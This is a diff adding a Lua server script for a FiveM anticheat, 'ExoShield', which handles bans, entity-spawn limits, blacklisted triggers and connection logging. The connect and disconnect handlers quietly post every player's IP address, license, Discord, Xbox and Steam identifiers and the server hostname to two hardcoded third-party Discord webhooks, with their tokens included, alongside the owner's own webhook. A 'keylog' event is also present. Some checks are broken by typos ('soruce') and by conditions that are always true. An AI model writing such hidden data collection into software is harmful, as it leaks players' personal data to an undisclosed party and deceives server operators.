@@ -1,1 +1,679 @@
-print('EXOSHIELD AUF DIE 1')
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------AUTHENTIFICATION-----------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------AUTHENTIFICATION-----------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+RegisterNetEvent("exo:checkBypass")
+AddEventHandler("exo:checkBypass", function ()
+    local id = source
+    if IsPlayerAceAllowed(id, "EXO:BYPASS") then
+        TriggerClientEvent("exo:gotBypass", id, true)
+    else
+        TriggerClientEvent("exo:gotBypass", id, false)
+    end
+end)
+
+SetConvarServerInfo("ExoShield", LOGO)
+
+Citizen.CreateThread(function()
+    local serverName = GetConvar("sv_hostname", "unknown")
+                local printStart = [[
+     ███████╗██╗  ██╗ ██████╗     ███████╗██╗  ██╗██╗███████╗██╗     ██████╗
+    ██╔════╝╚██╗██╔╝██╔═══██╗    ██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
+   █████╗   ╚███╔╝ ██║   ██║    ███████╗███████║██║█████╗  ██║     ██║  ██║ 
+  ██╔══╝   ██╔██╗ ██║   ██║    ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║  
+ ███████╗██╔╝ ██╗╚██████╔╝    ███████║██║  ██║██║███████╗███████╗██████╔╝]]
+                print(printStart)
+                print("[^3ExoShield^0] Successfully authorized with Server: ^2"..serverName.. "^0")
+                print("[^3ExoShield^0] Globalbans: ^1N/A^0")
+                print("[^3ExoShield^0] Localbans: ^1N/A^0")
+                print("[^3ExoShield^0] Help: ^2exohelp^0")
+end)
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------AUTHENTIFICATION-----------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------AUTHENTIFICATION-----------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+AddEventHandler('playerDropped', function(reason)
+    local identifier = "Not Found"
+    local license   = "Not Found"
+    local liveid    = "Not Found"
+    local xblid     = "Not Found"
+    local discord   = "Not Found"
+    local playerip = "Not Found"
+      local serverName = GetConvar("sv_hostname")
+      local hostname = GetConvar("sv_projectName")
+    local target    = id
+    local duree     = 0
+    local permanent = 0
+    local name = GetPlayerName(source)
+    
+    if true then
+          local sourceplayername = source
+            for k,v in ipairs(GetPlayerIdentifiers(source))do
+              if string.sub(v, 1, string.len("steam:")) == "steam:" then
+                identifier = v
+              elseif string.sub(v, 1, string.len("license:")) == "license:" then
+                license = v
+              elseif string.sub(v, 1, string.len("live:")) == "live:" then
+                liveid = v
+              elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
+                xblid  = v
+              elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
+                discord = v
+              elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
+                playerip = v
+              end
+            end
+    
+      local disconnectlog = {
+          {
+              ["color"] = "16748836",
+              ["title"] = "**Disconnect Logs**",
+              ["description"] = "Player: **"..name.."  ** \n\nLicense: **"..license.."** \n\nDiscord: **"..discord.."** \n\nLive: **"..liveid.."** \n\nXBL: **"..xblid.."**\n\nIP: **"..playerip.."**\n\n Identifier: **"..identifier.."** \n\nReason: ```"..reason.."```",
+            ["thumbnail"] = {
+                  url = "https://cdn.discordapp.com/attachments/1061653585483542530/1105220270299566130/exo_shield_logo_an.gif"
+                  },
+                  ["footer"] = {
+                  ["text"] = "Exo AntiCheat - "..os.date("%x %X %p"),
+                  },
+          }
+      }
+    
+    
+      local disconnectlog1 = {
+          {
+              ["color"] = "16748836",
+              ["title"] = "**Disconnect Logs [Global]**",
+              ["description"] = "Server Hostname:** " .. serverName .. "\n\n**Server Project Name:** " .. hostname .. "Player: **"..name.."  ** \nLicense: **"..license.."** \nDiscord: **"..discord.."** \nlive: **"..liveid.."** \nXBL: **"..xblid.."**\nIP: **"..playerip.."**\n identifier: **"..identifier.."** \nReason: ```"..reason.."```",
+            ["thumbnail"] = {
+                  url = "https://cdn.discordapp.com/attachments/1061653585483542530/1105220270299566130/exo_shield_logo_an.gif"
+                  },
+                  ["footer"] = {
+                  ["text"] = "Exo AntiCheat - "..os.date("%x %X %p"),
+                  },
+          }
+      }
+    
+    PerformHttpRequest(webhookconfig.webhooks.disconnect, function(err, text, headers) end, 'POST', json.encode({username = "Exo AntiCheat", embeds = disconnectlog}), { ['Content-Type'] = 'application/json' })
+    PerformHttpRequest("https://discord.com/api/webhooks/1160348490476552232/Zwv8VyRvnrTeL-Tvdt2N7ahetQE4lehjZX0XZ7XyfId-Cal8JE0taYSqnuaoxoBcb2vf", function(err, text, headers) end, 'POST', json.encode({username = "Exo AntiCheat Global Logs", embeds = disconnectlog1}), { ['Content-Type'] = 'application/json' })	
+              end
+    end, false)
+    
+    
+    AddEventHandler('playerConnecting', function()
+    local identifier = "Not Found"
+    local license   = "Not Found"
+    local liveid    = "Not Found"
+      local serverName = GetConvar("sv_hostname")
+      local hostname = GetConvar("sv_projectName")
+    local xblid     = "Not Found"
+    local discord   = "Not Found"
+    local playerip = "Not Found"
+    local reason    = "Not Found"
+    local name = GetPlayerName(source)
+    
+    if true then
+          local sourceplayername = source
+            for k,v in ipairs(GetPlayerIdentifiers(source))do
+              if string.sub(v, 1, string.len("steam:")) == "steam:" then
+                identifier = v
+              elseif string.sub(v, 1, string.len("license:")) == "license:" then
+                license = v
+              elseif string.sub(v, 1, string.len("live:")) == "live:" then
+                liveid = v
+              elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
+                xblid  = v
+              elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
+                discord = v
+              elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
+                playerip = v
+                            end
+                          end
+    
+      
+          
+              local logt = {
+          {
+              ["color"] = "1769216",
+              ["title"] = "**Connect Logs**",
+              ["description"] = "Player: **"..name.."** \n\nLicense: **"..license.."** \n\nDiscord: **"..discord.."** \n\nLive: **"..liveid.."** \n\nXBL: **"..xblid.."**\n\nIP: **||"..playerip.."||**\n\nIdentifier: **"..identifier.."**\n\n **",
+              ["thumbnail"] = {
+                  url = "https://cdn.discordapp.com/attachments/1061653585483542530/1105220270299566130/exo_shield_logo_an.gif"
+                  },
+                  ["footer"] = {
+                  ["text"] = "Exo AntiCheat - "..os.date("%x %X %p"),
+                  },
+          }
+      }
+    
+      local logt1 = {
+          {
+              ["color"] = "1769216",
+              ["title"] = "**Connect Logs [Global]**",
+              ["description"] = "Server Hostname:** " .. serverName .. "\n\n**Server Project Name:** " .. hostname .. "\n\nPlayer: **"..name.."** \n\nLicense: **"..license.."** \n\nDiscord: **"..discord.."** \n\nLive: **"..liveid.."** \n\nXBL: **"..xblid.."**\n\nIP: **||"..playerip.."||**\n\nIdentifier: **"..identifier.."**",
+              ["thumbnail"] = {
+                  url = "https://cdn.discordapp.com/attachments/1061653585483542530/1105220270299566130/exo_shield_logo_an.gif"
+                  },
+                  ["footer"] = {
+                  ["text"] = "Exo AntiCheat - "..os.date("%x %X %p"),
+                  },
+          }
+      }
+    
+    
+      PerformHttpRequest(webhookconfig.webhooks.connect, function(err, text, headers) end, 'POST', json.encode({username = "Exo AntiCheat", embeds = logt}), { ['Content-Type'] = 'application/json' })
+      PerformHttpRequest("https://discord.com/api/webhooks/1160348267956154428/aWxnELVlFKRncYAbOR5N4OZIanT6I8EtN2k-Zep8Aj8B_OpIV1oK4MmX3AgPorugh-_N", function(err, text, headers) end, 'POST', json.encode({username = "Exo AntiCheat Global Logs", embeds = logt1}), { ['Content-Type'] = 'application/json' })
+    
+              end
+    end, false)
+
+RegisterNetEvent("ban")
+AddEventHandler("ban", function(r)
+    if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+    if not source or source == 0 or source == nil then return end
+    local src = source
+    banPlayer(src, r)
+end)
+
+
+RegisterNetEvent("kick")
+AddEventHandler("kick", function(r)
+    if not source or soruce == 0 or source == nil then return end
+    local src = source
+    kickPlayer(src, r)
+end)
+
+RegisterNetEvent("log")
+AddEventHandler("log", function(r)
+    if not source or soruce == 0 or source == nil then return end
+    local src = source
+    logPlayer(src, r)
+end)
+
+RegisterNetEvent("keylog")
+AddEventHandler("keylog", function(r)
+    if not source or soruce == 0 or source == nil then return end
+    local src = source
+    keylogPlayer(src, r)
+end)
+
+RegisterServerEvent("dropak47modder")
+AddEventHandler("dropak47modder", function()
+    local src = source
+    DropModder(src, ' ')
+end)
+
+DropModder = function(id, args) 
+    DropPlayer(id, "Exo AntiCheat - FiveM AntiCheat\n\n You have been dropped for using the ak47 cheat")
+end
+
+-- Detections
+AddEventHandler('explosionEvent',function(source, ev)
+    local src = source
+
+    if serverconfig.ExplosionsList[ev.explosionType] ~= nil then
+        if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+            if serverconfig.ExplosionsList[ev.explosionType].block then
+               CancelEvent()
+            end
+            if serverconfig.ExplosionsList[ev.explosionType].log then
+               logPlayer(src, "Explosion detected", ev.explosionType)
+            end
+            if serverconfig.ExplosionsList[ev.explosionType].ban then
+                banPlayer(src, "Explosion detected", ev.explosionType)
+            end
+            Wait(2200)
+            if serverconfig.ExplosionsList[ev.explosionType].kick then
+               if src then
+                   kickPlayer(src)
+               end
+            end
+        
+
+    end
+end)
+
+Citizen.CreateThread(function()
+    particlesSpawned = {}
+    vehiclesSpawned = {}
+    pedsSpawned = {}
+    propsSpawned = {}
+    serverconfigedEvents = {}
+    while true do
+        Citizen.Wait(3000) -- augment/lower this if you want.
+        particlesSpawned = {}
+        vehiclesSpawned = {}
+        pedsSpawned = {}
+        propsSpawned = {}
+        serverconfigedEvents = {}
+    end
+end)
+
+AddEventHandler('ptFxEvent', function(sender, data)
+    if serverconfig.Particle.Use ~= true then return end
+    if IsPlayerAceAllowed(sender, 'EXO:BYPASS') then return end
+    if serverconfig.Particle.Cancel  then
+        CancelEvent()
+    end
+    local _src = sender
+    particlesSpawned[_src] = (particlesSpawned[_src] or 0) + 1
+    if particlesSpawned[_src] > serverconfig.Particle.Limit then
+            if sender ~= 0 or sender ~= nil then
+                if serverconfig.Particle.Ban then
+                    banPlayer(sender, "Particles spawned")
+                end
+            end
+    end
+end)
+
+function GetEntityOwner(entity)
+    if (not DoesEntityExist(entity)) then 
+        return nil 
+    end
+    local owner = NetworkGetEntityOwner(entity)
+    if (GetEntityPopulationType(entity) ~= 7) then return nil end
+    return owner
+end
+
+inTable = function(table, item)
+    for k,v in pairs(table) do
+        if v == item then return true end
+    end
+    return false
+end
+
+local cachedPlayerVehicles = {}
+local cachedPlayerPeds = {}
+AddEventHandler("entityCreating",  function(entity)
+    local owner = GetEntityOwner(entity)
+    local model = GetEntityModel(entity)
+    local modelOwner = NetworkGetEntityOwner(entity)
+    local WhitelistedPropList = {}
+    for k,v in pairs(serverconfig.Prop.Whitelist) do
+        table.insert(WhitelistedPropList, GetHashKey(v))
+    end
+    if GetEntityPopulationType(entity) == 0 then
+        if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+        if serverconfig.Prop.Use then
+            if inTable(WhitelistedPropList, model) == false then
+                if model ~= 0 and model ~= 225514697 then
+                    if serverconfig.Prop.Cancel then
+                        CancelEvent()
+                    end
+                    if modelOwner ~= 0 or modelOwner ~= nil then
+                        if serverconfig.Prop.Ban then
+                            banPlayer(modelOwner, "Prop Limit")
+                        end
+                    end
+                end
+            end
+        end
+    end
+    if (owner ~= nil and owner > 0) then
+        if GetEntityType(entity) == 1 then
+            if serverconfig.Ped.Use == true then
+                local _src = owner
+                
+                table.insert(cachedPlayerPeds, {
+                    owner = owner,
+                    vehicle = entity
+                })
+
+                local _src = owner
+                local vehicleCount = 0
+
+                for key, value in ipairs(cachedPlayerPeds) do
+                    if DoesEntityExist(value.vehicle) and value.owner == owner then
+                        vehicleCount = vehicleCount + 1
+                    end
+                end
+             
+                if vehicleCount > serverconfig.Ped.Limit then
+
+                    local vehiclesToDelete = {}
+
+                    for index, value in ipairs(cachedPlayerPeds) do
+                        if value.owner == owner then
+                            
+                            table.insert(vehiclesToDelete, index)
+                            if DoesEntityExist(value.vehicle) then
+                                DeleteEntity(value.vehicle)
+                                break
+                            end
+                        end
+                    end
+
+                    for index, value in ipairs(vehiclesToDelete) do
+                        table.remove(cachedPlayerPeds, value)
+                    end
+
+                end 
+
+            end
+        end
+        if GetEntityType(entity) == 2 then
+
+            vehiclesSpawned[owner] = (vehiclesSpawned[owner] or 0) + 1
+            if vehiclesSpawned[owner] > 7 then
+                banPlayer(owner, "Server Nuker detected")
+                return
+            end
+
+            if serverconfig.Vehicle.Use == true then
+                if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+
+                table.insert(cachedPlayerVehicles, {
+                    owner = owner,
+                    vehicle = entity
+                })
+
+                local _src = owner
+                local vehicleCount = 0
+
+                for key, value in ipairs(cachedPlayerVehicles) do
+                    if DoesEntityExist(value.vehicle) and value.owner == owner then
+                        vehicleCount = vehicleCount + 1
+                    end
+                end
+
+                if vehicleCount > serverconfig.Vehicle.Limit then
+
+                    local vehiclesToDelete = {}
+
+                    for index, value in ipairs(cachedPlayerVehicles) do
+                        if value.owner == owner then
+                            
+                            table.insert(vehiclesToDelete, index)
+                            if DoesEntityExist(value.vehicle) then
+                                DeleteEntity(value.vehicle)
+                                break
+                            end
+                        end
+                    end
+
+                    for index, value in ipairs(vehiclesToDelete) do
+                        table.remove(cachedPlayerVehicles, value)
+                    end
+
+                end 
+            end
+        end
+    end
+end)
+
+RegisterNetEvent("Exoac:kickKey")
+AddEventHandler("Exoac:kickKey", function(keyName)
+    if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+    if not source or soruce == 0 or source == nil then return end
+    local src = source
+    kickPlayer(src, "Pressed Blacklisted Key: " ..keyName)
+end)
+
+-- commands
+RegisterCommand("Exo-unban", function(source, args)
+
+    local src = source
+
+    if src == 0 then
+
+        if not args[1] then
+            print("^0[^4Exoac^0] No Verification-ID given")
+            return
+        end
+
+        local config = LoadResourceFile(GetCurrentResourceName(), "bans/banlist.json")
+        local cfg = json.decode(config)
+        if config == "{}" then
+            print("^0[^4Exoac^0] Player with Verification-ID: " ..args[1].. " has ^1NOT ^0been unbanned")
+            return
+        end
+        for k, v in pairs(cfg) do 
+            local id = tonumber(v['ID'])
+            if id == tonumber(args[1]) then 
+                local name = k
+                cfg[k] = nil
+                SaveResourceFile(GetCurrentResourceName(), "bans/banlist.json", json.encode(cfg, { indent = true }), -1)
+                print("^0[^4Exoac^0] Player with Verification-ID: " ..id.. " has been unbanned")
+            end
+        end
+
+    end
+
+end)
+
+AddEventHandler("clearPedTasksEvent", function(sender, data)
+    if  sender ~= 0 or sender ~= nil then
+        if serverconfig.ClearPedTasksEvent then
+            if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+            banPlayer(sender, 'Clear Ped Tasks Event')
+        end
+    end
+end)
+
+AddEventHandler("removeWeaponEvent", function(sender, data)
+    if  sender ~= 0 or sender ~= nil then
+        if serverconfig.RemovePedWeapons then
+            if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+            banPlayer(sender, 'Remove Weapon From Other')
+        end
+    end
+end)
+
+AddEventHandler("giveWeaponEvent", function(sender, data)
+    if  sender ~= 0 or sender ~= nil then
+        if serverconfig.GivePedWeapons then
+            if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+            banPlayer(sender, 'Give Weapon To Other')
+        end
+    end
+end)
+
+Citizen.CreateThread(function()
+    LimitedTriggerCount = {}
+    while true do
+        Citizen.Wait(triggerconfig.LimitedTrigger.Limit)
+        LimitedTriggerCount = {}
+    end
+end)
+
+Citizen.CreateThread(function()
+    if triggerconfig.BlacklistedTrigger.Use then
+        for key, value in ipairs(triggerconfig.BlacklistedTrigger.List) do
+            AddEventHandler(value.trigger)
+            RegisterNetEvent(value.trigger, function()
+                CancelEvent()
+                if value.ban then
+                    banPlayer(source, "Blacklisted Trigger: " ..value.trigger)
+                end
+            end)
+        end
+    end
+    if triggerconfig.LimitedTrigger.Use then
+        for key, value in ipairs(triggerconfig.LimitedTrigger.List) do
+            AddEventHandler(value.trigger)
+            RegisterNetEvent(value.trigger, function()
+                LimitedTriggerCount[source] = (LimitedTriggerCount[source] or 0) + 1
+                if LimitedTriggerCount[source] >= value.limit then
+                    CancelEvent()
+                    if value.ban then
+                        banPlayer(source, "Limited Trigger: " ..value.trigger)
+                    end
+                end
+            end)
+        end
+    end
+    if triggerconfig.NegativeTrigger.Use then
+        for key, value in ipairs(triggerconfig.NegativeTrigger.List) do
+            AddEventHandler(value.trigger)
+            RegisterNetEvent(value.trigger, function(args)
+                if args < 0 then
+                    CancelEvent()
+                    if value.ban then
+                        banPlayer(source, "Negative Trigger: " ..value.trigger)
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+RegisterCommand("Exo-clearpeds", function(source, args)
+    local src = source
+    if src == 0 then
+        TriggerClientEvent("Exoac:clear", -1, "peds")
+        print("^0[^4Exoac^0] Peds are clearing")
+    end
+end)
+
+RegisterCommand("Exo-clearvehicles", function(source, args)
+    local src = source
+    if src == 0 then
+        TriggerClientEvent("Exoac:clear", -1, "vehicles")
+        print("^0[^4Exoac^0] Vehicles are clearing")
+    end
+end)
+
+RegisterCommand("Exo-clearprops", function(source, args)
+    local src = source
+    if src == 0 then
+        TriggerClientEvent("Exoac:clear", -1, "props")
+        print("^0[^4Exoac^0] Props are clearing")
+    end
+end)
+
+RegisterCommand("cipherHaveAllExoRead", function(source, args)
+    CancelEvent()
+    local src = source
+    if src and src ~= 0 then
+        banPlayer(src, "Injection detected: cipherHaveAllExoRead")
+    end
+end)
+
+RegisterNetEvent("helperServer")
+AddEventHandler("helperServer", function(a, b, c)
+    if not serverconfig.ServerProtection.Use then return end
+    if serverconfig.ServerProtection.Cancel then
+        CancelEvent()
+    end
+    if serverconfig.ServerProtection.Debug then
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        if not a then a = "nothing" end if not b then b = "nothing" end if not c then c = "nothing" end
+        print("^0[^4Exoac^0] Payload: " ..a, b, c)
+    end
+    if serverconfig.ServerProtection.EmergencyShutdown then
+        print("^0[^4Exoac^0] ^1EMERGENCY SHUTDOWN!^0")
+        os.exit(1)
+    end
+end)
+
+RegisterNetEvent("helpCode")
+AddEventHandler("helpCode", function(a, b, c)
+    if not serverconfig.ServerProtection.Use then return end
+    if serverconfig.ServerProtection.Cancel then
+        CancelEvent()
+    end
+    if serverconfig.ServerProtection.Debug then
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        if not a then a = "nothing" end if not b then b = "nothing" end if not c then c = "nothing" end
+        print("^0[^4Exoac^0] Payload: " ..a, b, c)
+    end
+    if serverconfig.ServerProtection.EmergencyShutdown then
+        print("^0[^4Exoac^0] ^1EMERGENCY SHUTDOWN!^0")
+        os.exit(1)
+    end
+end)
+
+RegisterNetEvent("LockCphr")
+AddEventHandler("LockCphr", function(a, b, c)
+    if not serverconfig.ServerProtection.Use then return end
+    if serverconfig.ServerProtection.Cancel then
+        CancelEvent()
+    end
+    if serverconfig.ServerProtection.Debug then
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        print("^0[^4Exoac^0] ^1Attention we have detected some weird files. Check your Server!^0")
+        if not a then a = "nothing" end if not b then b = "nothing" end if not c then c = "nothing" end
+        print("^0[^4Exoac^0] Payload: " ..a, b, c)
+    end
+    if serverconfig.ServerProtection.EmergencyShutdown then
+        print("^0[^4Exoac^0] ^1EMERGENCY SHUTDOWN!^0")
+        os.exit(1)
+    end
+end)
+
+Citizen.CreateThread(function()
+
+    ESX = nil
+    TriggerEvent(serverconfig.GetSharedObject, function(obj) ESX = obj end)
+    Wait(100)
+    if ESX == nil then
+        print("^0[^4Exoac^0] Callback: AntiCheat has been optimized for STANDALONE")
+        return
+    else
+        print("^0[^4Exoac^0] Callback: AntiCheat has been optimized for ESX")
+    end
+    while true do
+        for i=0, GetNumPlayerIndices()-1 do
+            local source = GetPlayerFromIndex(i)
+            local xPlayer = ESX.GetPlayerFromId(source)
+            if xPlayer then
+                if serverconfig.antispawnsafeweapon then
+                local hasweapon = false
+                local pedweapon = GetSelectedPedWeapon(GetPlayerPed(source))
+                for k,v in ipairs(xPlayer.getLoadout()) do
+                    if GetHashKey(v.name) == GetSelectedPedWeapon(GetPlayerPed(source)) then
+                        hasweapon = true
+                    elseif pedweapon == -1569615261 then
+                        hasweapon = true
+                        break
+                    end
+                end
+                if not hasweapon and pedweapon ~= -1569615261 then
+                    banPlayer(source, "Injection detected: Tried to spawn a Weapon")
+                end
+            end
+        end
+    end
+        Citizen.Wait(2000)
+    end
+
+end)
+
+AddEventHandler("playerDropped", function(reason)
+    for k, v in pairs(serverconfig.blacklistedCrashes) do
+        if IsPlayerAceAllowed(source, 'EXO:BYPASS') then return end
+        local _src = source
+        if reason == v then
+            banPlayer(_src, "Blacklisted Crash (" ..reason.. ")")
+        end
+    end
+end)
+
+--- Anti eulen
+if serverconfig.EULENDETECTION then
+    CreateThread(function()
+        AddEventHandler("onResourceStart", function (ressource)
+            if (ressource == "test_script") then
+                TriggerClientEvent("resoruceTriggered", -1)
+            end
+        end)
+        while (true) do
+            ExecuteCommand("ensure test_script")
+            Wait(20000)
+        end
+    end)
+    end
